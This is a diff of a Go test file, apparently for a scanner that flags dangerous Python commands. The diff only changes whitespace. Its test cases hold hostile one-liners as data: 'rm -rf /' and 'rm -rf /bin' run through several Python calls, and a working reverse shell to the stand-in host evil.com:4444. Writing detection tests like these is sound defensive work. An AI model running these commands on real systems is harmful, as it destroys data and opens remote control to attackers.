@@ -937,40 +937,40 @@ func TestOperationalDestructionDetection(t *testing.T) {
 
 func TestPythonCommandExtraction(t *testing.T) {
 	tests := []struct {
-		name           string
-		command        string
-		expectedCode   string
-		description    string
+		name         string
+		command      string
+		expectedCode string
+		description  string
 	}{
 		{
-			name:        "os.system with rm -rf",
-			command:     `python -c 'import os; os.system("rm -rf /")'`,
+			name:         "os.system with rm -rf",
+			command:      `python -c 'import os; os.system("rm -rf /")'`,
 			expectedCode: "DANGEROUS_DELETE_ROOT",
-			description: "Should extract rm -rf / from os.system()",
+			description:  "Should extract rm -rf / from os.system()",
 		},
 		{
-			name:        "subprocess.call with shell command",
-			command:     `python -c 'import subprocess; subprocess.call(["rm", "-rf", "/"])'`,
+			name:         "subprocess.call with shell command",
+			command:      `python -c 'import subprocess; subprocess.call(["rm", "-rf", "/"])'`,
 			expectedCode: "DANGEROUS_DELETE_ROOT",
-			description: "Should extract command from subprocess.call()",
+			description:  "Should extract command from subprocess.call()",
 		},
 		{
-			name:        "subprocess.run with array",
-			command:     `python -c 'import subprocess; subprocess.run(["/bin/sh", "-i"])'`,
+			name:         "subprocess.run with array",
+			command:      `python -c 'import subprocess; subprocess.run(["/bin/sh", "-i"])'`,
 			expectedCode: "REVERSE_SHELL",
-			description: "Should extract shell command from subprocess.run()",
+			description:  "Should extract shell command from subprocess.run()",
 		},
 		{
-			name:        "complex reverse shell",
-			command:     `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+			name:         "complex reverse shell",
+			command:      `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
 			expectedCode: "REVERSE_SHELL",
-			description: "Should extract shell command from complex reverse shell code",
+			description:  "Should extract shell command from complex reverse shell code",
 		},
 		{
-			name:        "os.popen",
-			command:     `python -c 'import os; os.popen("rm -rf /bin")'`,
+			name:         "os.popen",
+			command:      `python -c 'import os; os.popen("rm -rf /bin")'`,
 			expectedCode: "POLICY_DENYLIST",
-			description: "Should extract command from os.popen()",
+			description:  "Should extract command from os.popen()",
 		},
 	}
 
@@ -982,7 +982,7 @@ func TestPythonCommandExtraction(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			script := []byte(tt.command)
 			findings := AnalyzeScript("test.py", script, policy)
-			
+
 			// Check if we found the expected command
 			found := false
 			for _, f := range findings {
@@ -991,7 +991,7 @@ func TestPythonCommandExtraction(t *testing.T) {
 					break
 				}
 			}
-			
+
 			if !found {
 				t.Errorf("Expected to find code %s, but got findings: %v", tt.expectedCode, findings)
 			}
